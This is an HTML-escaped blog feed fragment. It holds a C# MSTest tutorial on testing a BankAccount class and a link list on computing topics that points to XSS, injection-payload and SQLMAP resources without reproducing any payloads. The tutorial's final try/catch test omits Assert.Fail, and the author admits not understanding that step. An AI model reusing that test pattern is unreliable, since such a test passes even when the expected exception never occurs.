&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Credit(&lt;span style="color:#66d9ef">double&lt;/span> amount)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_balance += amount;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Main()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount ba = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">11.99&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ba.Credit(&lt;span style="color:#ae81ff">5.77&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ba.Debit(&lt;span style="color:#ae81ff">11.22&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Console.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Current balance is ${0}&amp;#34;&lt;/span>, ba.Balance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Build it by clicking &lt;strong>Build Solution&lt;/strong> in Build menu.&lt;/li>
&lt;/ul>
&lt;h2 id="create-a-unit-test-project">
 Create a unit test project
 &lt;a class="anchor" href="#create-a-unit-test-project">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Create a new project at solution explorer and named it &lt;strong>BankTests&lt;/strong>. The other part just maintain default setup.&lt;img src="https://imgur.com/ryriCen.png" alt="" />&lt;/li>
&lt;li>Select &lt;strong>MSTest Test Project&lt;/strong>&lt;img src="https://imgur.com/dI5h4T0.png" alt="" />&amp;lt;-This is important.&lt;/li>
&lt;li>&lt;strong>Add reference&lt;/strong> by selecting &lt;strong>Add Reference&lt;/strong> at &lt;strong>BankTests/Dependencies&lt;/strong>&lt;img src="https://imgur.com/9Miqs7p.png" alt="" />&lt;/li>
&lt;li>In the &lt;strong>Reference Manager&lt;/strong> dialog box, expand &lt;strong>Projects&lt;/strong>, select &lt;strong>Solution&lt;/strong>, and then check the Bank item.&lt;img src="https://imgur.com/ZBOR73N.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="create-the-test-class">
 Create the test class
 &lt;a class="anchor" href="#create-the-test-class">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Rename UnitTest1.cs to BankAccountTests.cs and replace the original code with the following section and add using statement at the top of the class file.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> Microsoft.VisualStudio.TestTools.UnitTesting;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> BankTests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [TestClass]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">BankAccountTests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e"> [TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> TestMethod1()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>BTW, the default class part can be ignored.&lt;/li>
&lt;/ul>
&lt;h2 id="create-the-first-test-method">
 Create the first test method
 &lt;a class="anchor" href="#create-the-first-test-method">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Replace the default class with the following code&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WithValidAmount_UpdatesBalance()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = &lt;span style="color:#ae81ff">4.55&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> expected = &lt;span style="color:#ae81ff">7.44&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> account.Debit(debitAmount);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> actual = account.Balance;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Assert.AreEqual(expected, actual, &lt;span style="color:#ae81ff">0.001&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Account not debited correctly&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Analyze this part: Assert.AreEqual method will catch the exception when &lt;strong>expected value&lt;/strong> unequal &lt;strong>actual value&lt;/strong> or their difference larger than &lt;strong>delta&lt;/strong>(0.001).&lt;/li>
&lt;li>Comparing with BankAccount.cs, the truly process of &lt;strong>Debit&lt;/strong> function is $beginningBalance - debitAmount = expected$ -&amp;gt; $11.99 - 4.55 = 7.44$&lt;/li>
&lt;/ul>
&lt;h2 id="build-and-run-the-test">
 Build and run the test
 &lt;a class="anchor" href="#build-and-run-the-test">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>On the Build menu, choose Build Solution (or press Ctrl + SHIFT + B) and press &lt;strong>Ctrl + E, T&lt;/strong> to open &lt;strong>Test Explorer&lt;/strong>, then &lt;strong>Run All&lt;/strong>.&lt;img src="https://imgur.com/ljNqXiS.png" alt="" />&lt;/li>
&lt;li>You&amp;rsquo;ll find that all Test are failed, so you must modify somewhere incorrect.&lt;/li>
&lt;/ul>
&lt;h2 id="fix-your-code-and-rerun-your-tests">
 Fix your code and rerun your tests
 &lt;a class="anchor" href="#fix-your-code-and-rerun-your-tests">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Return to BankAccount.cs and observe Debit() function.
&lt;img src="https://imgur.com/sGGMxu7.png" alt="" />&lt;/li>
&lt;li>Must change &lt;code>m_balance += amount;&lt;/code> to &lt;code>m_balance -= amount;&lt;/code>&lt;/li>
&lt;li>Build and Run the code again and you&amp;rsquo;ll find the test is correct this time&lt;img src="https://imgur.com/BNKS05j.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="create-and-run-new-test-methods">
 Create and run new test methods
 &lt;a class="anchor" href="#create-and-run-new-test-methods">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Add the following program in test class and rebuild it.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WhenAmountIsLessThanZero_ShouldThrowArgumentOutOfRange()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = -&lt;span style="color:#ae81ff">100.00&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act and assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Assert.ThrowsException&amp;lt;System.ArgumentOutOfRangeException&amp;gt;(() =&amp;gt; account.Debit(debitAmount));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = &lt;span style="color:#ae81ff">200.00&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act and assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Assert.ThrowsException&amp;lt;System.ArgumentOutOfRangeException&amp;gt;(() =&amp;gt; account.Debit(debitAmount));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Analyze: you&amp;rsquo;ll find out that the &lt;strong>debitAmout&lt;/strong> in the &lt;strong>1st test method&lt;/strong> is less than zero and the &lt;strong>debitAmount&lt;/strong> in &lt;strong>2nd test method&lt;/strong> is larger than &lt;strong>beginningBalance&lt;/strong>.&lt;/li>
&lt;li>After runing test explorer, these 2 code block are working properly, but you don&amp;rsquo;t know what kind of exception is(amount &amp;gt; m_balance or amount &amp;lt; 0), we just know somewhere throw back an exception message.&lt;/li>
&lt;/ul>
&lt;h2 id="revise-bankaccountcs">
 Revise BankAccount.cs
 &lt;a class="anchor" href="#revise-bankaccountcs">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Trace back to BankAccount.Debit and you&amp;rsquo;ll notice that they used the same exception, so you can determine to use ArgumentOutOfRangeException(String, Object, String) to contain the name of the argument, the argument value, and a user-defined message.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;gt; m_balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="refactor-the-code-under-test">
 Refactor the code under test
 &lt;a class="anchor" href="#refactor-the-code-under-test">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Define 2 constants for the error message at class scope, put the following code block in the class under test, BankAccout.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> DebitAmountExceedsBalanceMessage = &lt;span style="color:#e6db74">&amp;#34;Debit amount exceeds balance&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> DebitAmountLessThanZeroMessage = &lt;span style="color:#e6db74">&amp;#34;Debit amount is less than zero&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Then modify the 2 conditional statements in the Debit method.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;gt; m_balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> System.ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>, amount, DebitAmountExceedsBalanceMessage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> System.ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>, amount, DebitAmountLessThanZeroMessage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>Refactor test method like this. Replacing Assert.ThrowsException with using try/catch method to catch unexpected exception situation.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-C#" data-lang="C#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[TestMethod]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit_WhenAmountIsMoreThanBalance_ShouldThrowArgumentOutOfRange()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Arrange&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> beginningBalance = &lt;span style="color:#ae81ff">11.99&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> debitAmount = &lt;span style="color:#ae81ff">20.0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> BankAccount account = &lt;span style="color:#66d9ef">new&lt;/span> BankAccount(&lt;span style="color:#e6db74">&amp;#34;Mr. Bryan Walton&amp;#34;&lt;/span>, beginningBalance);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Act&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> account.Debit(debitAmount);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (System.ArgumentOutOfRangeException e)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Assert&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> StringAssert.Contains(e.Message, BankAccount.DebitAmountExceedsBalanceMessage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="the-last-part">
 The last part
 &lt;a class="anchor" href="#the-last-part">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Not really understatnd about adding Assert.Fail at the end of the test method.&lt;/li>
&lt;/ul>
&lt;h2 id="final-result">
 Final Result
 &lt;a class="anchor" href="#final-result">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/5NtqEKr.png" alt="" />&lt;/p></description></item><item><title>Useful Link</title><link>https://bernie6401.github.io/docs/tools/others/useful-link/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/useful-link/</guid><description>&lt;h1 id="useful-link">
 Useful Link
 &lt;a class="anchor" href="#useful-link">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="knowledge">
 Knowledge
 &lt;a class="anchor" href="#knowledge">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Knowledge&lt;/th>
 &lt;th style="text-align: left">Comment&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="http://violin-tao.blogspot.com/2016/04/crlflf-bug.html">CRLF VS LF&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.analyticsvidhya.com/blog/2021/07/explore-the-magic-methods-in-python/">magic method&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-2/">HttpOnly&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10193762">Encrypt VS Hash&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10240486">LFI VS RFI&lt;/a>&lt;/td>
 &lt;td style="text-align: left">LFI(Local File Inclusion)&lt;/br>產生的原因是程式設計師未對用戶參數未進行輸入檢查，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏&lt;/br>&lt;/br>RFI(Remote File Include)&lt;/br>基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數allow_url_include 訂為ON&amp;quot;&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://experience.dropbox.com/zh-tw/resources/what-is-ftp">FTP&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://experience.dropbox.com/zh-tw/resources/what-is-ftp">WebDAV&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://johnpam11.pixnet.net/blog/post/120987008-%E4%BB%80%E9%BA%BC%E6%98%AFbt%E7%A8%AE%E5%AD%90%EF%BC%9F">BitTorrent&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://moptt.tw/p/Storage_Zone.M.1618079877.A.829">TrueNAS Setup&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="http://thecodingtime.blogspot.com/2014/02/apimethodlibrary.html">API VS Method VS Library&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.letswrite.tw/websocket/">WebSocket&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.jyt0532.com/2020/02/14/jvm-introduction/">JVM&lt;/a>&lt;/td>
 &lt;td style="text-align: left">Briefly Introduction&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://pjchender.dev/computer-science/cs-process-thread/">Thread VS Process&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://blog.trendmicro.com.tw/?p=123">APT&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://gist.github.com/LeeKLTW/e5004f2d7046d43676d0891af8a13ef7">Arrow VS Dot VS Colon in C++&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://kknews.cc/zh-tw/code/ogmnm55.html">payload VS formData&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://raidnas.tw/hsinchu-nas-raid-explain-rescue/">RAID 0, 1, 0+1, 1+0, 5, 6&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.wongwonggoods.com/all-posts/python/python_parellel/python-multiprocessing-pool">How to use multiprocess in python &amp;amp; map VS pool VS apply_async&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://myapollo.com.tw/blog/begin-to-asyncio/">Python asyncio 從不會到上路&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10264453">JDK、JRE 和 JVM&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="tool-page">
 Tool-Page
 &lt;a class="anchor" href="#tool-page">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Tool&lt;/th>
 &lt;th style="text-align: left">Comment&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS-CheatSheet&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md">All-Injection:&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://ithelp.ithome.com.tw/articles/10249487">SQLMAP1&lt;/a>&lt;/br>&lt;a href="https://ithelp.ithome.com.tw/articles/10202811">SQLMAP2&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.virustotal.com/gui/">ViruTotal&lt;/a>&lt;/td>
 &lt;td style="text-align: left">幫忙分析檔案是否有病毒的網站&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://obfuscator.io/">JS 混淆器&lt;/a>&lt;/td>
 &lt;td style="text-align: left">把JS的程式變成可讀性很差的東西&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://beautifier.io/">JS 反混淆器&lt;/a>&lt;/td>
 &lt;td style="text-align: left">可以反混淆或解密JS的檔案&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://js.wfuapp.com/">JS 壓縮+加密+混淆+美化&lt;/a>&lt;/td>
